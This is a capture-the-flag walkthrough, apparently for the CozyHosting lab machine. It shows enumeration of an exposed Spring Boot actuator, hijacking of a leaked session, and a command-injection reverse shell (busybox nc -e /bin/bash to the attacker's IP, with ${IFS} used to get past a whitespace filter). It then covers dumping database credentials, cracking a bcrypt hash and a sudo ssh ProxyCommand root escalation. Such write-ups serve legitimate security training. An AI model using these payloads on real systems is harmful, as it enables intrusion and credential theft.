start machine by scanning the given host:
	
	rustscan -a 10.10.11.230
output:
	
	PORT     STATE SERVICE  REASON
	22/tcp   open  ssh      syn-ack
	80/tcp   open  http     syn-ack
	8000/tcp open  http-alt syn-ack   #i'm actually not sure about this one
given the services i go on with the enumeration for port 80.
When we visit the site we can see that is an hosting site.
we can add the machine to the hosts:
	
	echo '10.10.11.230		cozyhosting.htb' >>/etc/hosts
now we can enumerate all the directories:
	
	feroxbuster -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,py,txt,bak
the only interesting thing here are those two directory for now?:
	
	/login
	/admin
	/logout
	/error
for the login and admin we don't have creds and i don't feel like we need to bruteforce them;
so we need to take a look at the /error page that is not common:
it presents like this:
	
	Whitelabel Error Page
	This application has no explicit mapping for /error, so you are seeing this as a fallback.

	Tue Sep 05 22:02:37 UTC 2023
	There was an unexpected error (type=None, status=999).
is a very unusual error page so i googled it and found this:
	
	https://springhow.com/this-application-has-no-explicit-mapping-for-error/
is an error related to a Spring Boot framework.
So now we know our technology and we can search for vulnerability and missconfigurations,
so i searched and found this:
	
	https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/spring-boot-misconfiguration-actuator-endpoint-security-disabled/
this vulnerability consits in exposing url for endpoint management and info
where there are the following urls opened:
	
	/actuator/env
	/actuator/health
	/actuator/sessions
in the last one i found something strange:
	
	{	
		"6F02172164B5008C30BE85A361E3895C":"kanderson",
		"7D9466F4C4BADF20C172CEA31664775F":"UNAUTHORIZED",
		"906A49C2F096052D190B2232AB51138B":"kanderson"
		,"81F059A6FC49E0624D70ABCBC5495175":"UNAUTHORIZED"
		,"457D7B0B2D93AEA45C8C8B96D6842B60":"kanderson"
		,"6D6E06448BA2F8332CD51B2B279F43B4":"kanderson"
	}
those seems like sessions, some of them are UNAUTHORIZED meanwhile some other has the "kanderson" name
so we can maybe try to do session hijacking with one of the kanderson's token,
in fact we are in in /admin!
now we are inside an admin dashboard.
The dashboard is pretty limited, in fact the only interactive thing is an imput box where we can
add our host via ssh.
When we try to insert test data we got this error:
	
	ssh: connect to host 10.10.14.133 port 22: Connection timed out
this error is actually a linux terminal error for ssh
so we can maybe do some command injection, so i try a revshell (this is what the request looks like):
	
	hostname=localhost&username=$(busybox nc 10.10.14.133 5555 -e /bin/bash)
the request go trough but we got this error:
	
	The host was not added!
	Username can't contain whitespaces!
so we need to bypass this problem;
in bash there are several way to bypass, but i know and often use this one:
	
	$(busybox${IFS}nc${IFS}10.10.14.120${IFS}4444${IFS}-e${IFS}/bin/bash)
the ${IFS} variable is a space sostitution in bash.
so after starting a listener on our local machine we can execute command:
	
	python3 -m pwncat -lp 4444
so we got our first shell on the machine and we can start enumerate:
	
	(remote) app@cozyhosting:/app$ ls
							 cloudhosting-0.0.1.jar
we are the app user and there is this file in app directory,
this is the file for the web application running on port 80 so we can download the file and try analyze whats in it:
	
	(local) pwncat$ download cloudhosting-0.0.1.jar ./app.jar
so now we have the file on our local machine and we can analyze it by extracting all the file inside it:
	
	jar xvf app.jar
so now we have the file list of the app
in a particular file we can see some credentials for something that look like the database for the web app,
in fact inside this file:
	
	./BOOT-INF/classes/application.properties
we can see those credentials:
	
	spring.datasource.platform=postgres
	spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
	spring.datasource.username=postgres
	spring.datasource.password=V[REDACTED]R
so we can try access the db on remote machine with this command:
	
	psql -h localhost -U postgres
and inserting the password we found on the file.
Now we need to navigate a little bit the db:
	
	SELECT datname FROM pg_database;
output:
	
	   datname   
	-------------
	 postgres
	 cozyhosting
	 template1
	 template0
with this command we listed all the db present.
So now we can log inside the web app db like this:
	
	psql -h localhost -d cozyhosting -U postgres
after the password again we can enumerate the tables inside this db:
	
	SELECT table_name FROM information_schema.tables;
output:

	    tables
	-------------
	users
 	hosts
 	[...]
the users table seems to be interesting
so we dump all the content from the users table:
	
	SELECT * FROM users;
output:

	   name    |                           password                           | role  
	-----------+--------------------------------------------------------------+-------
	 kanderson | $2a$10$E/[REDACTED]eH58zim | User
	 admin     | $2a$10$Sp[REDACTED]VO8dm | Admin
this is very interesting so we can try to crack the admin pass
and see if we can use them anywhere.
	
	echo '$2a$10$Sp[REDACTED]VO8dm' > admin_hash_cozyhosting
After running this:
	
	hashcat admin_hash_cozyhosting
hashcat tells us that is:
	
	3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
so lets start cracking:
	
	hashcat admin_hash_cozyhosting -m 3200 -a 0 /usr/share/wordlists/rockyou.txt
output:
	
	$2a$10$Sp[REDACTED]VO8dm:m[REDACTED]d
so we found the password!!
we can try and log with the only user that is on the machine with that password:
	
	su josh
after inserting the pass we can submit the user flag and start the privesc
we start with classic check of sudo ability:
	
	sudo -l
output:
	
	(root) /usr/bin/ssh *
i searched that online and found this:
	
	https://gtfobins.github.io/gtfobins/ssh/
when u read GTFO bins in url u know u are gonna get root =)
in fact we can analyze the last case where we have sudo ability on the binary and we can copy the
exploit that is on the site:
	
	sudo /usr/bin/ssh -o ProxyCommand=';/bin/bash 0<&2 1>&2' x
and guess who we are now:
	
	root@cozyhosting:/home/josh# 
